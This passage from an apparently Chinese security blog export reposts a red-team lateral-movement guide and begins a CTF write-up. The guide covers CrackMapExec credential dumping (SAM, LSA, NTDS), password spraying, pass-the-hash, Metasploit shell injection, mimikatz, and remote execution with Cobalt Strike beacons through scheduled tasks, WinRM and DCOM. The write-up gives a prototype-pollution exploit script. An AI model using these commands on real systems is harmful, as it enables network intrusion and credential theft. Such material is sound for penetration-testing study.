class=\"line\">crackmapexec 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -X &#39;$PSVersionTable&#39;  --amsi-bypass &#x2F;path&#x2F;payload</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/31.png\"></p>\n<h2 id=\"cme网络扫描\"><a href=\"#cme网络扫描\" class=\"headerlink\" title=\"cme网络扫描\"></a>cme网络扫描</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 10.0.0.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/32.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --shares</span><br><span class=\"line\">crackmapexec smb 192.168.10.83 -u airs-win7 -p aab+1s --shares</span><br><span class=\"line\">crackmapexec smb 192.168.10.83 -u airs-win7 -H 04cea78fa35a5be51f4aee6375651e8a --shares </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/33.png\"></p>\n<h2 id=\"枚举空会话\"><a href=\"#枚举空会话\" class=\"headerlink\" title=\"枚举空会话\"></a>枚举空会话</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cme smb 10.10.10.161 -u &#39;&#39; -p &#39;&#39;</span><br><span class=\"line\">cme smb 10.10.10.161 --pass-pol</span><br><span class=\"line\">cme smb 10.10.10.161 --users</span><br><span class=\"line\">cme smb 10.10.10.161 --groups</span><br><span class=\"line\"></span><br><span class=\"line\">cme smb 10.10.10.178 -u &#39;a&#39; -p &#39;&#39; -shares</span><br><span class=\"line\">cme smb 10.10.10.178 -u -p -shares</span><br><span class=\"line\"></span><br><span class=\"line\"># 以递归方式遍历所有共享s</span><br><span class=\"line\">crackmapexec smb  -u  -p  -M spider_plus</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"凭证获取\"><a href=\"#凭证获取\" class=\"headerlink\" title=\"凭证获取\"></a>凭证获取</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --sam  </span><br><span class=\"line\">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --lsa</span><br><span class=\"line\">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --ntds</span><br><span class=\"line\">crackmapexec smb 192.168.10.173 -u administrator -p aab+1s --ntds vss</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"msf反弹shell\"><a href=\"#msf反弹shell\" class=\"headerlink\" title=\"msf反弹shell\"></a>msf反弹shell</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/34.png\"></p>\n<h2 id=\"枚举远程目标上的活动会话\"><a href=\"#枚举远程目标上的活动会话\" class=\"headerlink\" title=\"枚举远程目标上的活动会话\"></a>枚举远程目标上的活动会话</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cme smb 192.168.1.0&#x2F;24 -u UserNAme -p &#39;PASSWORDHERE&#39; --sessions</span><br><span class=\"line\">cme smb 192.168.1.0&#x2F;24 -u UserNAme -p &#39;PASSWORDHERE&#39; --shares</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"密码喷洒\"><a href=\"#密码喷洒\" class=\"headerlink\" title=\"密码喷洒\"></a>密码喷洒</h2><p>使用空格指定多个用户名 / 密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18</span><br><span class=\"line\">cme smb 192.168.1.101 -u user1 -p password1 password2 password3</span><br></pre></td></tr></table></figure>\n\n<p>通过文本指定字典</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cme smb 192.168.1.101 -u &#x2F;path&#x2F;to&#x2F;users.txt -p Summer18</span><br><span class=\"line\">cme smb 192.168.1.101 -u Administrator -p &#x2F;path&#x2F;to&#x2F;passwords.txt</span><br></pre></td></tr></table></figure>\n\n<p>找到密码后继续爆破</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cme smb 192.168.1.101 -u &#x2F;path&#x2F;to&#x2F;users.txt -p Summer18 --continue-on-success</span><br><span class=\"line\"></span><br><span class=\"line\"># 一对一爆破</span><br><span class=\"line\">cme smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"认证\"><a href=\"#认证\" class=\"headerlink\" title=\"认证\"></a>认证</h2><ul>\n<li>域</li>\n</ul>\n<p>User/Hash</p>\n<p>获取凭证如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;NTHASH&#39;</span><br><span class=\"line\">cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;LM:NT&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">cme smb 192.168.1.0&#x2F;24 -u Administrator -H &#39;13b29964cc2480b4ef454c59562e675c&#39;</span><br><span class=\"line\">cme smb 192.168.1.0&#x2F;24 -u Administrator -H &#39;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#39;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>本地认证</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#~ cme smb 192.168.1.0&#x2F;24 -u UserNAme -p &#39;PASSWORDHERE&#39; --local-auth</span><br><span class=\"line\">#~ cme smb 192.168.1.0&#x2F;24 -u &#39;&#39; -p &#39;&#39; --local-auth</span><br><span class=\"line\"></span><br><span class=\"line\">#~ cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;NTHASH&#39; --local-auth</span><br><span class=\"line\">#~ cme smb 192.168.1.0&#x2F;24 -u UserNAme -H &#39;LM:NT&#39; --local-auth</span><br><span class=\"line\"></span><br><span class=\"line\">#~ cme smb 192.168.1.0&#x2F;24 -u localguy -H &#39;13b29964cc2480b4ef454c59562e675c&#39; --local-auth</span><br><span class=\"line\">#~ cme smb 192.168.1.0&#x2F;24 -u Administrator -H &#39;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#39;</span><br></pre></td></tr></table></figure>\n\n<p>爆破结果后如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB 192.168.1.101 445 HOSTNAME [+] HOSTNAME\\Username:Password (Pwn3d!) </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"winRM\"><a href=\"#winRM\" class=\"headerlink\" title=\"winRM\"></a>winRM</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#~ cme winrm 192.168.1.0&#x2F;24 -u userfile -p passwordfile --no-bruteforce</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># use the latest release, CME is now a binary packaged will all its dependencies</span><br><span class=\"line\">root@payload$ wget https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec&#x2F;releases&#x2F;download&#x2F;v5.0.1dev&#x2F;cme-ubuntu-latest.zip</span><br><span class=\"line\"></span><br><span class=\"line\"># execute cme (smb, winrm, mssql, ...)</span><br><span class=\"line\">root@payload$ cme smb -L</span><br><span class=\"line\">root@payload$ cme smb -M name_module -o VAR&#x3D;DATA</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H &#39;:5858d47a41e40b40f294b3100bea611f&#39; -d &#39;DOMAIN&#39; -M invoke_sessiongopher</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION&#x3D;enable</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST&#x3D;192.168.1.63 LPORT&#x3D;4443</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H &quot;:5858d47a41e40b40f294b3100bea611f&quot; -M web_delivery -o URL&#x3D;&quot;https:&#x2F;&#x2F;IP:PORT&#x2F;posh-payload&quot;</span><br><span class=\"line\">root@payload$ cme smb 192.168.1.100 -u Administrator -H &quot;:5858d47a41e40b40f294b3100bea611f&quot; --exec-method smbexec -X &#39;whoami&#39;</span><br><span class=\"line\">root@payload$ cme smb 10.10.14.0&#x2F;24 -u user -p &#39;Password&#39; --local-auth -M mimikatz</span><br><span class=\"line\">root@payload$ cme mimikatz --server http --server-port 80</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"at、schtasks\"><a href=\"#at、schtasks\" class=\"headerlink\" title=\"at、schtasks\"></a>at、schtasks</h1><ul>\n<li>at</li>\n</ul>\n<p>windows 版本 <strong>&lt; 2012</strong>，高版本中使用 schtasks 命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">at [\\computername] [[id] [&#x2F;delete] | &#x2F;delete [&#x2F;yes]]</span><br><span class=\"line\">at [\\computername] &lt;time&gt; [&#x2F;interactive] [&#x2F;every:date[,...] | &#x2F;next:date[,...]] &lt;command&gt;</span><br></pre></td></tr></table></figure>\n\n<p>生成 smb beacon</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/35.png\"></p>\n<p>上传 smb beacon 文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/36.png\"></p>\n<p>添加任务计划</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">shell at \\\\192.168.10.173 10:51 c:\\local-smb.exe</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/37.png\"></p>\n<p>已运行，无法反弹，smb shell 的问题。</p>\n<p>换成 web beacon，成功反弹。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/38.png\"></p>\n<p><a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/at\">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/at</a></p>\n<ul>\n<li>schtasks</li>\n</ul>\n<p>windows <strong>&gt;= 2012</strong></p>\n<p><strong>schtasks create</strong></p>\n<p>创建任务对应执行文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">schtasks &#x2F;create &#x2F;sc &lt;scheduletype&gt; &#x2F;tn &lt;taskname&gt; &#x2F;tr &lt;taskrun&gt; [&#x2F;s &lt;computer&gt; [&#x2F;u [&lt;domain&gt;\\]&lt;user&gt; [&#x2F;p &lt;password&gt;]]] [&#x2F;ru &#123;[&lt;domain&gt;\\]&lt;user&gt; | system&#125;] [&#x2F;rp &lt;password&gt;] [&#x2F;mo &lt;modifier&gt;] [&#x2F;d &lt;day&gt;[,&lt;day&gt;...] | *] [&#x2F;m &lt;month&gt;[,&lt;month&gt;...]] [&#x2F;i &lt;idletime&gt;] [&#x2F;st &lt;starttime&gt;] [&#x2F;ri &lt;interval&gt;] [&#123;&#x2F;et &lt;endtime&gt; | &#x2F;du &lt;duration&gt;&#125; [&#x2F;k]] [&#x2F;sd &lt;startdate&gt;] [&#x2F;ed &lt;enddate&gt;] [&#x2F;it] [&#x2F;z] [&#x2F;f]</span><br><span class=\"line\"></span><br><span class=\"line\">schtasks &#x2F;create &#x2F;s 192.168.213.163 &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr c:\\user.bat &#x2F;F</span><br></pre></td></tr></table></figure>\n\n<p><strong>schtasks run</strong></p>\n<p>执行文件任务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">schtasks &#x2F;run &#x2F;s 192.168.213.163 &#x2F;tn adduser &#x2F;i</span><br></pre></td></tr></table></figure>\n\n<p><strong>schtasks delete</strong></p>\n<p>删除执行文件任务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">schtasks &#x2F;delect &#x2F;s 192.168.213.163 &#x2F;tn adduser &#x2F;f</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create</a></p>\n<h1 id=\"sharpwmi\"><a href=\"#sharpwmi\" class=\"headerlink\" title=\"sharpwmi\"></a>sharpwmi</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\sharpwmi.exe login 192.168.10.1&#x2F;24 administrator aab+1s cmd whoami</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/39.png\"></p>\n<p>cs 报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[-] Invoke_3 on EntryPoint failed.</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/40.png\"></p>\n<h1 id=\"nbtscan\"><a href=\"#nbtscan\" class=\"headerlink\" title=\"nbtscan\"></a>nbtscan</h1><p>通过 IP 扫描网络获取 bios 名称（计算机名）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/41.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/42.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash$ sudo nbtscan -v -s : 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>cs plugin</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/43.png\"></p>\n<h1 id=\"winRM-1\"><a href=\"#winRM-1\" class=\"headerlink\" title=\"winRM\"></a>winRM</h1><p>WinRM（windows 远程管理）是 WS 管理协议的 Microsoft 实现，一种基于标准的 SOAP 协议，允许来自不同供应商的硬件和操作系统相互操作，能够对本地或远程的服务器进行管理，获得一个类似 Telnet 的交互式命令行 shell，以便降低系统管理员复杂的操作。</p>\n<p>端口：HTTP(5985)、HTTPS SOAP（5986）</p>\n<p>前提：凭证及权限</p>\n<p>CS 中有 WinRM 模块</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">winrm：x86，通过 WinRM 来运行一个 PowerShell 脚本</span><br><span class=\"line\">winrm：x64，通过 WinRM 来运行一个 PowerShell 脚本</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/44.png\"></p>\n<p>进入 winrm64 后，内容如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/45.png\"></p>\n<p>前提需要有认证，才可以横向进入，此处的认证获取可以通过内部撞库、历史 RDP 凭证等方式获取，内部撞库是拿已知的密码去尝试是否有复用密码，历史 RDP 凭证是如果管理员再内网通过 3389 登录后且记录了密码，可以通过获取历史 RDP 登录记录获取凭证。</p>\n<p>如上图所示，已经拥有 192.168.1.214 的密码凭证，但不清楚 192.168.1.55 的凭证，此时可以尝试使用 192.168.1.214 的凭证。</p>\n<p>监听器和会话按需选择，会话是当前的 beacon。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/46.png\"></p>\n<p>尝试运行，报错了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">jump winrm64 192.168.1.55 test</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/47.png\"></p>\n<p>查看服务器端口情况，未开启 5985 端口。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/48.png\"></p>\n<p>可通过 winrm 命令开启 5985 端口，windows server 2008 默认 winrm 服务是启动的，但端口未开放，需要通过<code>winrm quickconfig -q</code> 或者 <code>winrm qc</code> 开启端口。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/49.png\"></p>\n<ul>\n<li>开启 winRM 服务：</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/50.png\"></p>\n<p>重新查看端口开放情况，5985 端口已打开。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/51.png\"></p>\n<ul>\n<li>开启防火墙或关闭防火墙命令</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\system32&gt;netsh advfirewall firewall set rule group&#x3D;&quot;Windows 远程管理&quot; new enable&#x3D;yes</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>使用 powershell 连接服务器</li>\n</ul>\n<p>需提前开启信任主机</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator&gt; Set-Item wsman:\\localhost\\Client\\TrustedHosts -value 192.168.1.* -Force</span><br><span class=\"line\"># 这个命令需要再客户端执行，而不是再服务端执行</span><br><span class=\"line\"></span><br><span class=\"line\">或者用下面的命令</span><br><span class=\"line\">winrm set winrm&#x2F;config&#x2F;client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator&gt; Enter-PSSession 192.168.1.55 -Credential administrator</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/52.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/53.png\"></p>\n<p>输入凭证，连接成功。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/54.png\"></p>\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">New-PSSession -ComputerName 192.168.1.55 -Credential (Get-Credential)</span><br><span class=\"line\">Enter-PSSession 1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/55.png\"></p>\n<p>通过 CS 操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">beacon&gt; jump winrm64 192.168.1.55 test</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/56.png\"></p>\n<p>成功返回 shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/57.png\"></p>\n<p>windows8、windows10、windows server 2012 及以上系统，WinRM 服务默认开启。</p>\n<h2 id=\"evil-winrm\"><a href=\"#evil-winrm\" class=\"headerlink\" title=\"evil-winrm\"></a>evil-winrm</h2><p>kali上很好用的工具</p>\n<p><a href=\"https://github.com/Hackplayers/evil-winrm\">GitHub - Hackplayers/evil-winrm: The ultimate WinRM shell for hacking/pentesting</a></p>\n<h1 id=\"WinRS\"><a href=\"#WinRS\" class=\"headerlink\" title=\"WinRS\"></a>WinRS</h1><p>WinRS (Windows Remote Shell) 是一种远程管理工具，用于在 Windows 远程服务器上运行命令行命令。WinRS 使用 WinRM（Windows Remote Management）协议向远程计算机发送命令行请求。<br>WinRS 在 Windows Server 2008 及更高版本的操作系统中预安装，并且可以在 Windows 7 及更高版本的操作系统中启用。要使用 WinRS，您必须在远程服务器上启用 WinRM，并且在本地计算机上运行命令时必须使用管理员权限。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">winrs -r:192.168.1.55 &quot;cmd &#x2F;c ipconfig&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/58.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 端口复用下</span><br><span class=\"line\">winrs -r:http:&#x2F;&#x2F;192.168.1.55 -u:administrator -p:aab+1s whoami</span><br><span class=\"line\">winrs -r:http:&#x2F;&#x2F;192.168.1.55 -u:administrator -p:aab+1s cmd</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"DCOM\"><a href=\"#DCOM\" class=\"headerlink\" title=\"DCOM\"></a>DCOM</h1><p>DCOM 代表分布式组件对象模型（Distributed Component Object Model），它是一种 Microsoft 的分布式系统服务。它允许计算机上的应用程序通过网络连接和通信。DCOM 使开发人员能够从远程计算机上执行代码，并使应用程序之间的通信更为容易和灵活。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator&gt; Get-ChildItem &#39;registry::HKEY_CLASSES_ROOT\\WOW6432Node\\CLSID\\&#123;49B2791A-B1AE-4C90-9B8E-E860BA07F889&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/59.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator&gt; $a &#x3D; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.1.55&quot;))</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator&gt; $a.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;&#x2F;c hostname &gt; c:\\fromdcom.txt&quot;,&quot;7&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator&gt; Get-Content \\\\192.168.1.55\\c$\\fromdcom.txt</span><br><span class=\"line\">WIN-BVVD8VFVMPR</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/60.png\"></p>\n<h1 id=\"SCShell\"><a href=\"#SCShell\" class=\"headerlink\" title=\"SCShell\"></a>SCShell</h1><p><a href=\"https://github.com/Mr-Un1k0d3r/SCShell\">GitHub - Mr-Un1k0d3r/SCShell: Fileless lateral movement tool that relies on ChangeServiceConfigA to run command</a></p>\n<h1 id=\"No445\"><a href=\"#No445\" class=\"headerlink\" title=\"No445\"></a>No445</h1><p><a href=\"https://github.com/JDArmy/NO445-lateral-movement\">GitHub - JDArmy/NO445-lateral-movement: command execute without 445 port</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.redteam101.tech/offensive-security/lateral-movement/shi-yong-scshell-jin-hang-heng-xiang-yi-dong\">https://www.redteam101.tech/offensive-security/lateral-movement/shi-yong-scshell-jin-hang-heng-xiang-yi-dong</a><br><a href=\"https://github.com/BlWasp/CME_cheatSheet\">https://github.com/BlWasp/CME_cheatSheet</a><br><a href=\"https://mpgn.gitbook.io/crackmapexec/\">https://mpgn.gitbook.io/crackmapexec/</a><br><a href=\"https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/\">https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/</a><br><a href=\"https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/\">https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/</a><br><a href=\"https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/\">https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/</a><br><a href=\"http://www.kxsy.work/2022/02/14/nei-wang-shen-tou-zui-shi-yong-de-heng-xiang-yi-dong-zong-jie/\">http://www.kxsy.work/2022/02/14/nei-wang-shen-tou-zui-shi-yong-de-heng-xiang-yi-dong-zong-jie/</a><br><a href=\"https://www.cnblogs.com/gamewyd/p/6805595.html\">https://www.cnblogs.com/gamewyd/p/6805595.html</a><br><a href=\"https://www.cnblogs.com/zhengna/p/15309006.html\">https://www.cnblogs.com/zhengna/p/15309006.html</a><br><a href=\"http://k8gege.org/Ladon/WinrmScan.html\">http://k8gege.org/Ladon/WinrmScan.html</a><br><a href=\"https://cloud.tencent.com/developer/article/1937116\">https://cloud.tencent.com/developer/article/1937116</a></p>\n<h1 id=\"文章说明\"><a href=\"#文章说明\" class=\"headerlink\" title=\"文章说明\"></a>文章说明</h1><p>文章来源于：<a href=\"https://lca.xlog.app/nei-wang-shen-tou-ji-chu\">https://lca.xlog.app/nei-wang-shen-tou-ji-chu</a></p>\n<p>由于担心师傅更换域名或其他原因搜不到该文章，所以做了一份copy。</p>\n","categories":["Red-Team"]},{"title":"强网拟态 2022","url":"/2023/12/25/nitai/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>W&amp;M：<a href=\"https://blog.wm-team.cn/index.php/archives/34/\">强网拟态 2022 By W&amp;M - W&amp;M Team (wm-team.cn)</a></p>\n<a id=\"more\"></a>\n\n<h1 id=\"WHOYOUARE\"><a href=\"#WHOYOUARE\" class=\"headerlink\" title=\"WHOYOUARE\"></a>WHOYOUARE</h1><ul>\n<li>原型污染</li>\n</ul>\n<p>贴两个图</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nitai/image-20221107115323429.png\" alt=\"image-20221107115323429\"></p>\n<p>merge过滤 <code>__proto__</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/nitai/image-20221107115345316.png\" alt=\"image-20221107115345316\"></p>\n<p>payload污染env</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://172.52.31.56:3000/user&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">req</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    r = requests.post(url, json=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;user&quot;</span>: json.dumps(&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;command&quot;</span>: [<span class=\"string\">&quot;-c&quot;</span>, payload],</span><br><span class=\"line\">            <span class=\"string\">&quot;constructor&quot;</span>: &#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;prototype&quot;</span>: &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;argv0&quot;</span>: <span class=\"string\">&quot;cat /flag&quot;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    d = r.json()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> d[<span class=\"string\">&#x27;status&#x27;</span>] ==<span class=\"number\">0</span>:</span><br><span class=\"line\">        print(d[<span class=\"string\">&#x27;info&#x27;</span>].removeprefix(<span class=\"string\">&#x27;User of guest : &#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        print(d)</span><br><span class=\"line\"></span><br><span class=\"line\">req(<span class=\"string\">&quot;env&quot;</span>)</span><br><span class=\"line\">req(<span 